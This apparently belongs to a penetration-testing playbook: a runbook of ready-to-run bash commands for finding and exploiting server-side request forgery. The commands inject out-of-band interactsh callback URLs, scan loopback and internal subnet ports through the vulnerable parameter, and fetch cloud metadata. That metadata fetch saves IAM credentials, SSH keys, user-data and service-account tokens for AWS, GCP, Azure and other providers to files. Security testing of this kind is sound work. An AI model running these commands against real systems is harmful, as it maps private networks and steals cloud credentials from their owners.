# SSRF — Probe

## Purpose
Inject canary URLs into every SSRF candidate parameter. Use interactsh for OOB detection, test loopback addresses, and attempt internal port scanning via the SSRF vector. Identify blind vs visible SSRF.

## Required Variables
- `$TARGET_URL` — target endpoint with URL-accepting param
- `$VULN_PARAM` — confirmed URL-accepting parameter name
- `$OUTDIR` — output root

## Commands

### P0 — Set Up OOB Callback (interactsh)

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

interactsh-client -json -o "$OUTDIR/ssrf/interactsh_output.json" -poll-interval 5 &
sleep 3
INTERACTSH_URL=$(jq -r '.[0]["full-id"]' "$OUTDIR/ssrf/interactsh_output.json" 2>/dev/null)
echo "$INTERACTSH_URL" > "$OUTDIR/ssrf/interactsh_url.txt"
echo "Interactsh URL: $INTERACTSH_URL"
```

### P1 — OOB Callback Injection (All Candidate Params)

```bash
INTERACTSH_URL=$(cat "$OUTDIR/ssrf/interactsh_url.txt")

while read -r param; do
  TS=$(date +%s)
  echo "[*] Testing param=$param"
  curl -s -o /dev/null "$TARGET_URL?${param}=http://${INTERACTSH_URL}/${param}_${TS}" &
done < "$OUTDIR/ssrf/ssrf_param_names.txt"
wait

echo "Probes sent. Check interactsh output for HTTP/DNS callbacks."
sleep 15
jq '.[] | select(.protocol=="http" or .protocol=="dns") | {host: ."full-id", request: .request, protocol: .protocol}' "$OUTDIR/ssrf/interactsh_output.json" > "$OUTDIR/ssrf/ssrf_callbacks.json"

# Count callbacks
CALLBACKS=$(jq -r '.request' "$OUTDIR/ssrf/ssrf_callbacks.json" 2>/dev/null | wc -l)
echo "Callbacks received: $CALLBACKS"
```

### P2 — Loopback / Localhost Probe

```bash
# Test that the backend actually makes HTTP requests to internal addresses
for ip in "127.0.0.1" "localhost" "0.0.0.0" "[::1]"; do
  for port in 80 443 8080 3000 5000 6379 9200; do
    echo -n "  $ip:$port → "
    curl -s -o /dev/null -w "HTTP %{http_code} | %{size_download}b | %{time_total}s\n" "$TARGET_URL?${VULN_PARAM}=http://${ip}:${port}/"
  done
done | tee "$OUTDIR/ssrf/localhost_probe.txt"
```

### P3 — Internal Network Port Scan via SSRF

```bash
# Create internal ports wordlist
printf '22\n80\n443\n3000\n3306\n5000\n5432\n6379\n8000\n8080\n8443\n8500\n9200\n11211\n15672\n27017\n9090\n9092\n10250\n2379\n6443\n8200\n8983\n' > "$OUTDIR/ssrf/internal_ports.txt"

# Port scan 127.0.0.1 via SSRF
ffuf -u "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:FUZZ" \
  -w "$OUTDIR/ssrf/internal_ports.txt" \
  -t 5 -of csv -o "$OUTDIR/ssrf/port_probe_ffuf.csv"

# Also scan common internal IP subnets
for ip in "10.0.0.1" "172.16.0.1" "192.168.0.1" "10.0.0.2"; do
  safe=$(echo "$ip" | tr '.' '_')
  curl -s -o /dev/null -w "HTTP %{http_code}\n" "$TARGET_URL?${VULN_PARAM}=http://${ip}:80/" | tee -a "$OUTDIR/ssrf/subnet_probe.txt"
  curl -s -o /dev/null -w "HTTP %{http_code}\n" "$TARGET_URL?${VULN_PARAM}=http://${ip}:8080/" | tee -a "$OUTDIR/ssrf/subnet_probe.txt"
done
```

### P4 — Cloud Metadata Probe (AWS)

```bash
curl -s -o /dev/null -w "AWS meta: HTTP %{http_code} | %{size_download}b\n" \
  "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/"

curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  > "$OUTDIR/ssrf/aws_iam_roles.txt"

curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key" \
  > "$OUTDIR/ssrf/aws_ssh_keys.txt"

curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/user-data/" \
  > "$OUTDIR/ssrf/aws_userdata.txt"
```

### P5 — Cloud Metadata Probe (GCP)

```bash
curl -s -o /dev/null -w "GCP meta: HTTP %{http_code} | %{size_download}b\n" \
  "$TARGET_URL?${VULN_PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  > "$OUTDIR/ssrf/gcp_token.txt"
```

### P6 — Cloud Metadata Probe (Azure / DO / Alibaba)

```bash
# Azure
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/metadata/instance?api-version=2021-02-01" > "$OUTDIR/ssrf/azure_meta.txt"

# DigitalOcean
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/metadata/v1.json" > "$OUTDIR/ssrf/do_meta.txt"

# Alibaba
curl -s "$TARGET_URL?${VULN_PARAM}=http://100.100.100.200/latest/meta-data/" > "$OUTDIR/ssrf/alicloud_meta.txt"

# Oracle
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/opc/v2/instance/" > "$OUTDIR/ssrf/oracle_meta.txt"
```

## Detection Signals
- interactsh receives HTTP callback → **SSRF confirmed** (target fetches arbitrary URLs)
- interactsh receives DNS callback → **blind SSRF confirmed** (target resolves hostnames)
- Localhost probe returns non-error responses → internal service accessible
- Cloud metadata endpoint returns credential JSON → **critical**: IAM credentials exposed
- ffuf port scan shows response size deviation on specific port → internal service running

## False Positives
- interactsh callback from CDN/proxy not the origin — verify User-Agent/IP matches target
- Localhost probe returns 200 but it's the app's own error page — check response body for distinguishing content
- Metadata returns `404` — cloud provider may not be AWS/GCP/Azure; test all providers
- ffuf detecting same response size as connection refused → filter baseline and re-scan with `-fs`

## Next
├── If interactsh callback received → go to `03-verify.md` for internal service enumeration
├── If cloud metadata returns credentials → go to `04-impact-escalation.md` immediately (Critical)
├── If localhost probe succeeds on specific ports → go to `03-verify.md` for service fingerprinting
├── If all probes negative → test URL parser bypasses in `03-verify.md`
└── Always → save callback evidence and probe results before escalating